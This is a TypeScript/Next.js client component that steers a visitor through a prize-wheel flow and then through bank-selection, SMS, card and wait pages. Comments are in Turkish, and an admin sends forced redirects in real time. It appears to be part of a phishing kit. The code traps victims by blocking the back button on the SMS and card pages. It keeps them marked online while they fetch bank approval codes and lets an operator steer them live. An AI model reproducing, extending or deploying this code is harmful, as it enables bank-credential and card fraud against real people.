"use client";

import { useEffect } from "react";
import { usePathname, useRouter } from "next/navigation";
import type { SessionStatus, SessionStep } from "@/types/session";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import {
  pathToStep,
  resolveStepTargetPath,
  shouldRedirectToServerStep,
  isBackNavigationBlockedStep,
  getStepPriority,
} from "@/lib/session-routes";

const SS_BACK_FLAG_KEY = "__sr_back_flag__";
const SS_BACK_FLAG_TS = "__sr_back_flag_ts__";
const BACK_FLAG_MAX_AGE_MS = 15000;
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { logAuditEvent } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";

/**
 * Sadece ŞU AN BANKA LİSTESİNDEYSEK (ya da bank detayındaysak) YÖNLENDİRMEYİ DURAKLAT.
 * (Kullanıcı GERİ tuşuyla banka listesine geri döndüyse, adminin tekrar listeye atmasını / loopa girmesini engeller)
 *
 * ⚠️ DİKKAT: Başka bir sayfada (win/sms/card/wait vb.) isek ADMİN'İN GÖNDERDİĞİ "banken" GELİRSE
 *    BU FLAG YOK SAYILIR, YÖNLENDİRME KAÇINILMAZDIR!
 */
function shouldPauseBankListRedirects(pathname: string) {
  const onBankRelatedPage =
    pathname.startsWith("/banken") ||
    pathname.startsWith("/banks") ||
    pathname.includes("/bank/");
  if (!onBankRelatedPage) return false; // Banka disinda sayfada ise: ADMIN yonlendirmesini UYGULA

  try {
    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
  } catch {
    return false;
  }
}

export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
  const pathname = usePathname();
  const router = useRouter();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);

  /* Presence: demo ortamında admin için online göstergesi — KESIN cozum (last_ping_at)
     - 3 SN'DE BIR sunucuya PING at (POST /api/session/ping, service-role)
     - SAYFA KAPANINCA (pagehide / beforeunload): DIREKT OFFLINE (silinmez, tarayıcı kapanınca kesin gitsin)
     - SIRKETICI visibility=hidden (sekme arkada, mobil kilit, SMS uygulamasına gitme vs.):
         * SON 10 DAKIKA ICINDE visibility=visible olduysa: OFFLINE ISARETLEME, sadece status='online' KALIR.
         * Kullanici 10dk dan uzun sure arkada tutarsa ya da tarayici gerçekten kapatilirsa: pagehide/beforeunload ile OFFLINE olur.
         * Boylece SMS onayi icin banka uygulamasi / messenger acinca ONLINE gozukmeye devam eder (bug olmaz). */
  useEffect(() => {
    persistActiveSession(sessionId, effectiveRouteSessionId);

    const PING_INTERVAL = 3_000;
    // Sadece SAYFA GERCEKTEN kapatilinca (pagehide/beforeunload) OFFLINE yap.
    // visibility=hidden icin MAKS 10 DAKIKA boyunca ONLINE tut (gecerli olursa tekrar visible olunca ONLINE devam).
    const VISIBILITY_HIDDEN_TOLERANCE_MS = 10 * 60 * 1000;
    let lastVisibleAt = Date.now();

    const currentStep = (() => {
      if (pathname.startsWith("/wheel")) return "wheel";
      if (pathname.startsWith("/banken")) return "banken";
      if (pathname.startsWith("/special-approval")) return "special_approval";
      try {
        const p = pathname.replace(/^\/+/, "");
        const known = ["code_entry","win","bank","sms","card","wait","invalid_bank","congrats","live_support"];
        const first = p.split("/")[0];
        if (known.includes(first)) return first;
        return first || null;
      } catch { return null; }
    })();

    const buildBody = (status: "online" | "offline") => JSON.stringify({
      sessionId,
      publicId: effectiveRouteSessionId,
      pathname,
      currentStep,
      status,
    });

    const pingOnline = async () => {
      try {
        // Birincil deneme: normal sessionId ile
        const resp = await fetch("/api/session/ping", {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/json" },
          body: buildBody("online"),
        });
        try {
          const j = await resp.json() as any;
          // Sunucu sessionId bulamadiysa ve fallback publicId ile denediyse sorun yok.
          // Session HIC bulunamadiysa (note='session_not_found...' ve publicId yoksa)
          //   ya da status=404 ise client burada anlar.
          if (j && j.ok === false && j.error) {
            logAuditEvent({
              session_id: sessionId,
              public_id: effectiveRouteSessionId,
              event_kind: "presence",
              event_action: "ping_online_failed",
              status: "error",
              pathname,
              meta: { httpStatus: resp.status, error: j.error, note: j.note || null },
            });
          }
        } catch { /* sessizce json parse hatasi */ }
      } catch (e: any) {
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "ping_online_fetch_error",
          status: "error",
          pathname,
          meta: { error: e?.message || String(e) },
        });
      }
    };

    const pingOfflineOrOnline = (status: "offline" | "online") => {
      try {
        const payload = new Blob([buildBody(status)], { type: "application/json" });
        if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
          try {
            const beaconOk = navigator.sendBeacon("/api/session/ping", payload);
            if (beaconOk) return;
          } catch { /* fallback */ }
        }
        try {
          void fetch("/api/session/ping", {
            method: "POST",
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            body: buildBody(status),
            keepalive: true,
          });
        } catch { /* ignore */ }
      } catch { /* ignore */ }
    };

    // Ilk mountta ONLINE ping + audit log
    void pingOnline();
    logAuditEvent({
      session_id: sessionId,
      public_id: effectiveRouteSessionId,
      event_kind: "presence",
      event_action: "session_mount_ping",
      pathname,
      meta: { effectiveRouteSessionId, ping_interval_ms: PING_INTERVAL, currentStep },
    });

    const t = window.setInterval(() => {
      // Interval boyunca visibility=hidden olsa bile (durdurulmayan interval tarayıcılar),
      // son 10dk icinde gorulduyse ONLINE ping atmaya devam et (SMS donunce kesin online).
      if (document.visibilityState === "visible") {
        lastVisibleAt = Date.now();
      }
      void pingOnline();
    }, PING_INTERVAL);

    // GERCEKTEN sayfadan cikiliyorsa (kapatma): OFFLINE.
    // NOT: beforeunload + pagehide ikisini birden dinle, her iki durumda da OFFLINE olsun.
    const markOffline = () => {
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "presence",
        event_action: "session_mark_offline_beacon",
        status: "warn",
        pathname,
      });
      pingOfflineOrOnline("offline");
    };

    const onVisibility = () => {
      if (document.visibilityState === "visible") {
        lastVisibleAt = Date.now();
        void pingOnline();
        return;
      }
      // visibility=hidden: sadece 10dk dan uzun sure beklediyse OFFLINE yap.
      // Aksi halde (kisa sureli SMS / app gecisi) ONLINE kalsın.
      const hiddenFor = Date.now() - lastVisibleAt;
      if (hiddenFor > VISIBILITY_HIDDEN_TOLERANCE_MS) {
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "session_hidden_timeout_offline",
          status: "warn",
          pathname,
          meta: { hiddenForMs: hiddenFor, toleranceMs: VISIBILITY_HIDDEN_TOLERANCE_MS },
        });
        pingOfflineOrOnline("offline");
      } else {
        // Kısa süreli arka planda kalma: DIKKATLI, sadece audit log at, OFFLINE ISARETLEME.
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "session_hidden_short_tolerated",
          pathname,
          meta: { hiddenForMs: hiddenFor, toleranceMs: VISIBILITY_HIDDEN_TOLERANCE_MS },
        });
      }
    };

    window.addEventListener("pagehide", markOffline);
    window.addEventListener("beforeunload", markOffline);
    document.addEventListener("visibilitychange", onVisibility);

    return () => {
      window.clearInterval(t);
      window.removeEventListener("pagehide", markOffline);
      window.removeEventListener("beforeunload", markOffline);
      document.removeEventListener("visibilitychange", onVisibility);
      // React unmount (SPA route degisimi): sayfada duruluyorsa (baska bir route), ONLINE kalmaya devam edebilir.
      // Bu yuzden cleanup'ta OFFLINE ISARETLEMIYORUZ. Sayfa kapaninca pagehide tetiklenir ve OFFLINE olur.
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* Global Geri (Back) Tuşu Yöneticisi:
     a) Eğer şu anki adım BLOCKED (wait/sms/card/special_approval/live_support) ise
        GERİ tuşunu tamamen BLOKLA (wait-client'teki fence mantığı gibi)
     b) Aksi halde GERİ tuşuna basıldığında bir sonraki sayfada (yani GERİ gidilen
        sayfada) SessionRealtimeGate'in anlaması için sessionStorage bayrağı koy.
  */
  useEffect(() => {
    if (typeof window === "undefined") return;

    let localStep: string | null = pathToStep(pathname);
    if (pathname.startsWith("/wheel")) localStep = "wheel";
    if (pathname.startsWith("/special-approval")) localStep = "special_approval";
    const currentStep = localStep;
    const blocked = isBackNavigationBlockedStep(currentStep);
    const pageUrl = window.location.href;
    const fenceKey = `__srg_fence_${sessionId}__`;

    // --- (a) BLOKLANMIŞ SAYFALAR (wait/sms/card/special/live_support): GERİ TUŞU ENGELLE ---
    if (blocked) {
      try {
        if ((window.history.state as any)?.[fenceKey] !== true) {
          window.history.replaceState(
            { ...(window.history.state || {}), [fenceKey]: true, __srgAnchor: true },
            "",
            pageUrl,
          );
        }
        window.history.pushState(
          { ...(window.history.state || {}), [fenceKey]: true, __srgFence: 1 },
          "",
          pageUrl,
        );
      } catch {}

      const onPopStateBlocked = () => {
        try {
          window.history.replaceState(
            { ...(window.history.state || {}), [fenceKey]: true, __srgAnchor: true },
            "",
            pageUrl,
          );
          window.history.pushState(
            { ...(window.history.state || {}), [fenceKey]: true, __srgFence: 2 },
            "",
            pageUrl,
          );
        } catch {}
        logAuditEvent({
          session_id: sessionId || null,
          public_id: effectiveRouteSessionId || null,
          event_kind: "step",
          event_action: "back_blocked",
          from_step: currentStep,
          to_step: currentStep,
          pathname,
          meta: { reason: "blocked_step", currentStep },
        });
        window.scrollTo({ top: 0, left: 0, behavior: "auto" });
      };

      window.addEventListener("popstate", onPopStateBlocked);
      return () => window.removeEventListener("popstate", onPopStateBlocked);
    }

    // --- (c) ÖZEL: BANKA DETAY SAYFASINDA (pathname.includes "/bank/") GERİ TUŞU:
    //       ⭐ KESİN KURAL: 0 bekleme, 0 flash, 0 başka sayfa. DOĞRUDAN BANKA LİSTESİNE (/banken)
    //       Kullanıcı "seçtiği bankadan geri dönerken" asla win, wait, veya eski bankayı
    //       "flash" olarak görmemeli. Hard window.location.replace ile SPA render atlanır.
    const isOnBankDetailPage = (
      pathname.includes("/bank/") ||
      pathname.startsWith("/bank/")
    );
    if (isOnBankDetailPage) {
      const BANK_FENCE = `__bank_back_fence_${sessionId}__`;
      try {
        if ((window.history.state as any)?.[BANK_FENCE] !== true) {
          window.history.replaceState(
            { ...(window.history.state || {}), [BANK_FENCE]: true, __bankAnchor: true },
            "",
            pageUrl,
          );
        }
        window.history.pushState(
          { ...(window.history.state || {}), [BANK_FENCE]: true, __bankFence: 1 },
          "",
          pageUrl,
        );
      } catch {}

      const onPopStateBankBack = () => {
        try {
          // Bayrak 1: Banken sayfasına geri döndüğümüzü SessionRealtimeGate sonraki mountta bilsin
          window.sessionStorage.setItem(RETURN_TO_BANK_LIST_FLAG, "1");
          // Bayrak 2: CameFromBackNav bayrağı — sunucu adımı client adımına göre yenilesin,
          //           YÖNLENDİRME YAPMASIN (kullanıcıyı bıraktığı yerde bırak)
          window.sessionStorage.setItem(SS_BACK_FLAG_KEY, "1");
          window.sessionStorage.setItem(SS_BACK_FLAG_TS, String(Date.now()));
        } catch {}

        logAuditEvent({
          session_id: sessionId || null,
          public_id: effectiveRouteSessionId || null,
          event_kind: "step",
          event_action: "bank_back_to_list_override",
          from_step: currentStep || "bank",
          to_step: "banken",
          pathname,
          meta: { reason: "explicit_user_back_button_hard_replace" },
        });

        // SessionId/query'yi koruyarak banken'e git
        const currentQuery = window.location.search;
        const bankenPath = currentQuery ? `/banken${currentQuery}` : "/banken";

        // ⭐ HARD REPLACE: SPA (next/router) kullanma. Doğrudan tarayıcı history'sini sıfırla.
        //    Sonuç: 0 render beklemesi, 0 flash.
        window.location.replace(bankenPath);
      };

      window.addEventListener("popstate", onPopStateBankBack);
      return () => window.removeEventListener("popstate", onPopStateBankBack);
    }

    // --- (b) NORMAL SAYFALAR (wheel/win/banken/bank/invalid_bank/congrats ...): GERİ tuşu çalışsın ---
    // popstate tetiklendiğinde bir sonraki SessionRealtimeGate mount'unun
    // "GERİ ile geldi" diye anlaması için sessionStorage bayrağı koy.
    const onPopStateNormal = () => {
      try {
        window.sessionStorage.setItem(SS_BACK_FLAG_KEY, "1");
        window.sessionStorage.setItem(SS_BACK_FLAG_TS, String(Date.now()));
      } catch {}
      logAuditEvent({
        session_id: sessionId || null,
        public_id: effectiveRouteSessionId || null,
        event_kind: "step",
        event_action: "back_initiated",
        from_step: currentStep,
        pathname,
        meta: { currentStep },
      });
    };
    window.addEventListener("popstate", onPopStateNormal);
    return () => window.removeEventListener("popstate", onPopStateNormal);
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* İlk yüklemede sunucu adımı ile senkron
     ⚠️ KURAL:
       - GERİ tuşu ile gelmişsek (cameFromBackNav): Kullanıcı GERİYE gitti, DB'yi LOCAL (şu anki sayfa) ile
         güncelle (admin panelinde doğru görünsün) ama YÖNLENDİRME YAPMA (kullanıcıyı bıraktığı yerde bırak).
       - GERİ tuşu ile GELMEMİŞSEM (normal sayfa açılışı / yenileme / harici link):
         ⭐ KOŞULSUZ: Sunucudaki (DB'deki) serverStep NE İSE ORAYA GİT.
           Öncelik kuralı (serverP > localP) YOK. shouldPause YOK. shouldRedirect YOK.
           (Admin banken atarsa beklemede olsan bile bankene gidersin.)
  */
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const supabase = createBrowserSupabaseClient();
      if (supabase === null) return;

      // GERİ bayrağını oku (popstate ile geldik mi?) — OKUNDUKTAN SONRA temizle (tek seferlik)
      let cameFromBackNav = false;
      let backTs: number | null = null;
      try {
        const flag = window.sessionStorage.getItem(SS_BACK_FLAG_KEY);
        const tsStr = window.sessionStorage.getItem(SS_BACK_FLAG_TS);
        if (flag === "1" && tsStr) {
          backTs = Number(tsStr);
          const age = Date.now() - backTs;
          if (age >= 0 && age <= BACK_FLAG_MAX_AGE_MS) cameFromBackNav = true;
        }
      } catch {}

      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();

      if (cancelled) return;

      // ⭐ SESSION SILINDI (admin log'dan sildi): kullanici olu linkle kaldi.
      //    Yerine bos yeni session ac -> admin'de yeni log gorunur,
      //    kullanici isim formuna duser (akis bastan baslar).
      if (!data) {
        try {
          const { data: fresh } = await supabase
            .from("sessions")
            .insert({
              amount: 0,
              current_step: "wheel",
              status: "online",
              is_hidden: false,
              form_data: { currency: "€", is_wheel_game: true },
            })
            .select("id")
            .maybeSingle();
          if (fresh?.id) {
            try { window.location.replace(`/?session=${fresh.id}`); } catch {}
          }
        } catch {}
        return;
      }

      // Bayrağı VERİYİ ÇEKİNCE (async bittikten sonra) sil
      if (cameFromBackNav) {
        try {
          window.sessionStorage.removeItem(SS_BACK_FLAG_KEY);
          window.sessionStorage.removeItem(SS_BACK_FLAG_TS);
        } catch {}
      }

      const status = data.status as SessionStatus | undefined;
      if (status === "SPECIAL_INFO") {
        if (!pathname.startsWith("/special-approval")) {
          logAuditEvent({
            session_id: sessionId,
            public_id: effectiveRouteSessionId,
            event_kind: "step",
            event_action: "server_step_redirect",
            from_step: pathname,
            to_step: "special_approval",
            pathname,
            meta: { reason: "initial_sync_special_info", cameFromBackNav },
          });
          router.replace("/special-approval");
          // ⭐ FLASH YOK: Router SPA renderını BEKLEME. Hemen HARD location replace.
          try { window.location.replace("/special-approval"); } catch {}
        }
        return;
      }

      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith("/wheel")) local = "wheel";

      // --- (1) GERİ DÖNÜŞ (BACK tuşu): Kullanıcı geriye gittiyse DB'yi güncelle, YÖNLENDİRME YAPMA.
      if (cameFromBackNav && local && data.current_step) {

        // --- (1.b) EK KURAL: Kullanıcı BANKA DETAY'dan GERİ tuşu ile BANKEN LİSTESİNE döndüyse:
        //            sessionStorage["bank-page:return-to-list"] === "1" bayrağı var ise
        //            ⭐ SUNUCU ADIMI (serverStep: "bank"/"wait"/herhangi bir şey) NE OLURSA OLSUN
        //              BANKEN'DE BIRAK. YÖNLENDİRME YAPMA. DB'yi banken olarak güncelle.
        //              Flash, bekleme veya başka sayfaya atama KALICI OLARAK BİTER.
        if (local === "banken") {
          let explicitBankReturnFlag = false;
          try {
            const f = window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG);
            if (f === "1") { explicitBankReturnFlag = true; window.sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG); }
          } catch {}
          if (explicitBankReturnFlag) {
            const serverStep = data.current_step as SessionStep;
            logAuditEvent({
              session_id: sessionId,
              public_id: effectiveRouteSessionId,
              event_kind: "step",
              event_action: "returned_to_bank_list_via_back",
              from_step: serverStep,
              to_step: local,
              pathname,
              meta: { reason: "bank_back_explicit_user_flag_stay_on_list, no_redirect" },
            });
            await supabase
              .from("sessions")
              .update({ current_step: "banken", is_hidden: false })
              .eq("id", sessionId);
            return;
          }
        }

        const serverStep = data.current_step as SessionStep;
        const localP = getStepPriority(local);
        const serverP = getStepPriority(serverStep);

        if (serverP > localP) {
          logAuditEvent({
            session_id: sessionId,
            public_id: effectiveRouteSessionId,
            event_kind: "step",
            event_action: "db_step_sync_from_back",
            from_step: serverStep,
            to_step: local,
            pathname,
            meta: { reason: "user_hit_back_button_no_redirect", localP, serverP },
          });
          await supabase
            .from("sessions")
            .update({ current_step: local, is_hidden: false })
            .eq("id", sessionId);
          return;
        }
      }

      if (!data.current_step) return;
      const serverStep = data.current_step as SessionStep;

      // --- (2) NORMAL AÇILIŞ (back değil):
      //     ⚠️ ÖNEMLİ İSTİSNA: Kullanıcı DIŞARIDAN BİR LİNKE (wheel, win, banken, sms vb.)
      //        TIKLAYARAK GELDİ VE DB HENÜZ BAŞLANGIÇ ADIMINDA (code_entry) ise
      //        veya DB adımı daha GERİDE ise:
      //           → KULLANICIYI /CODE (katılım kodu) ekranına ZORLAMA!
      //           → TERSİNE, DB'Yİ KULLANICININ ŞU AN OLDUĞU ADIMA GÜNCELLE.
      //        (Linkte wheel ise kullanıcı orada kalmalı, win ise isim girmeli —
      //         katılım kodu sadece /code linki açılırsa istenir.)
      //
      //     Ancak ADMİN PANELİNDEN atanmış bir adım varsa (wait, invalid_bank, special_approval
      //     gibi admin korumalı veya serverStep, local'den DAHA İLERİDE ise):
      //           → ⭐ KOŞULSUZ YÖNLENDİR (eski davranış).
      if (local === serverStep) return;

      const localP = local ? getStepPriority(local) : -1;
      const serverP = getStepPriority(serverStep);
      const isFreshEntryStep = (
        serverStep === "code_entry" ||
        !data.current_step
      );
      const userIsAtValidStep = (
        local != null &&
        local !== "code_entry" &&
        localP >= 0
      );

      // Eğer kullanıcı geçerli bir adımda (linkle gelmiş) ve DB henüz başlangıçta:
      //     → Kullanıcı burada kalsın, DB'yi senkronize et (katılım kodu isteme!)
      if (userIsAtValidStep && isFreshEntryStep) {
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "step",
          event_action: "db_step_sync_from_direct_link",
          from_step: serverStep,
          to_step: local,
          pathname,
          meta: {
            reason: "user_opened_link_directly_skip_code_entry_prompt",
            localP,
            serverP,
            cameFromBackNav,
          },
        });
        await supabase
          .from("sessions")
          .update({ current_step: local as any, is_hidden: false })
          .eq("id", sessionId);
        return;
      }

      // Diğer tüm durumlarda (ADMİN atamış, beklemede vb.): ⭐ KOŞULSUZ YÖNLENDİR
      const target = resolveStepTargetPath(
        serverStep,
        sessionId,
        effectiveRouteSessionId,
        (data.form_data ?? {}) as { bankSlug?: string | null },
      );
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "step",
        event_action: "server_step_redirect",
        from_step: local,
        to_step: serverStep,
        pathname,
        meta: {
          reason: "initial_sync_unconditional_admin_override",
          cameFromBackNav,
          localP,
          serverP,
          isFreshEntryStep,
          userIsAtValidStep,
        },
      });
      router.replace(target);
      // ⭐ FLASH YOK: Router SPA renderını BEKLEME. Hemen HARD location replace (0 bekleme).
      try { window.location.replace(target); } catch {}
    })();
    return () => {
      cancelled = true;
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* ⭐⭐⭐ ADMİN ZORLAMALI YÖNLENDİRME (KULLANICI SAYFA YENİLEMESİZ) ⭐⭐⭐
     - 2 katmanlı mekanizma: (1) Realtime (ideal, 0-500ms), (2) Polling FALLBACK (1.5sn)
     - Realtime Supabase publication, replica identity, RLS, websocket, WSS proxy vs. ne sebeple
       KOPARSA bile polling fallback KESİN çalışır ve kullanıcı 1-2 sn içinde yeni sayfaya gider.
     - Hem realtime hem polling'te aynı "forceNavigate" fonksiyonunu kullan:
         a) Next.js router.replace → SPA (YENİLEMESİZ, TERCİH EDİLEN)
         b) 350ms sonra hala aynı path'te isek window.location → (FULL RELOAD, GARANTİ)
  */
  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;
    let cancelled = false;

    let lastSeen: { step: SessionStep | null; status: SessionStatus | null; ts: number } = {
      step: null,
      status: null,
      ts: 0,
    };

    const computeLocal = () => {
      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith("/wheel")) local = "wheel";
      if (pathname.startsWith("/special-approval")) local = "special_approval";
      return local as SessionStep | null;
    };

    const forceNavigate = (destStep: SessionStep, formData: { bankSlug?: string | null } | undefined, reason: string) => {
      if (cancelled) return;
      const local = computeLocal();
      if (local === destStep) return;

      const target = resolveStepTargetPath(destStep, sessionId, effectiveRouteSessionId, formData ?? {});
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "step",
        event_action: "admin_force_redirect",
        from_step: local,
        to_step: destStep,
        pathname,
        meta: { reason, transport: "location.replace_first_then_router", target },
      });

      // ⭐ FLASH YOK KURALI (forceNavigate):
      //   1. HEMEN HARD window.location.replace (0 ms bekleme, SPA render olmadan direkt)
      //   2. 10ms SONRA fallback: hala aynı path'teyse router.replace (SPA) dene.
      //   Eski: 350ms bekle + önce SPA, sonra location (flash sebepti!).
      try { window.location.replace(target); } catch {}

      const checkPath = pathname;
      window.setTimeout(() => {
        if (typeof window === "undefined") return;
        if (window.location.pathname === checkPath) {
          logAuditEvent({
            session_id: sessionId,
            public_id: effectiveRouteSessionId,
            event_kind: "step",
            event_action: "admin_force_redirect_fallback_router",
            from_step: local,
            to_step: destStep,
            pathname,
            meta: { reason: "location_replace_did_not_move_within_10ms_try_router", target },
          });
          try { router.replace(target); } catch {}
        }
      }, 10);
    };

    const processPayload = (
      newStep: SessionStep | null,
      newStatus: SessionStatus | null,
      formData: { bankSlug?: string | null } | undefined,
      triggerReason: string,
    ) => {
      if (!newStep && newStatus !== "SPECIAL_INFO") return;
      // (1) SPECIAL_INFO (status bazlı): her zaman özel bildirim sayfasına
      if (newStatus === "SPECIAL_INFO") {
        if (!pathname.startsWith("/special-approval")) {
          forceNavigate("special_approval", undefined, `${triggerReason}:special_info_status`);
        }
        return;
      }
      if (!newStep) return;
      forceNavigate(newStep, formData, triggerReason);
    };

    // ---- Katman 1: Realtime channel ----
    const channel = supabase
      .channel(`srg-session:${sessionId}`)
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const next = payload.new as {
            current_step?: SessionStep;
            status?: SessionStatus;
            form_data?: { bankSlug?: string | null } | null;
          } | null;
          const old = payload.old as { current_step?: SessionStep; status?: SessionStatus } | null;
          const newStep = next && typeof next.current_step === "string" ? next.current_step : null;
          const newStatus = next && typeof next.status === "string" ? next.status : null;
          const oldStep = old && typeof old.current_step === "string" ? old.current_step : null;
          const oldStatus = old && typeof old.status === "string" ? old.status : null;
          if (oldStep === newStep && oldStatus === newStatus) return; // online→online vs. atla
          lastSeen = { step: newStep, status: newStatus, ts: Date.now() };
          processPayload(newStep, newStatus, next?.form_data ?? undefined, "realtime");
        },
      )
      .subscribe();

    // ---- Katman 2: Polling FALLBACK (realtime koparsa bile çalışır) ----
    const POLL_INTERVAL = 1500;
    const runPoll = async () => {
      if (cancelled || !supabase) return;
      try {
        const { data } = await supabase
          .from("sessions")
          .select("current_step,status,form_data")
          .eq("id", sessionId)
          .maybeSingle();
        if (cancelled || !data) return;

        const newStep = typeof data.current_step === "string" ? (data.current_step as SessionStep) : null;
        const newStatus = typeof data.status === "string" ? (data.status as SessionStatus) : null;
        const changed = newStep !== lastSeen.step || newStatus !== lastSeen.status;
        if (!changed && lastSeen.ts > 0) return;
        lastSeen = { step: newStep, status: newStatus, ts: Date.now() };
        processPayload(newStep, newStatus, (data.form_data ?? {}) as { bankSlug?: string | null }, "polling");
      } catch { /* sessiz */ }
    };
    // İlk anket: 80ms sonra (hemen sayfa açılınca)
    const bootT = window.setTimeout(() => void runPoll(), 80);
    const intervalT = window.setInterval(() => void runPoll(), POLL_INTERVAL);

    return () => {
      cancelled = true;
      window.clearTimeout(bootT);
      window.clearInterval(intervalT);
      void supabase.removeChannel(channel);
    };
  }, [effectiveRouteSessionId, sessionId, pathname, router]);

  return null;
}
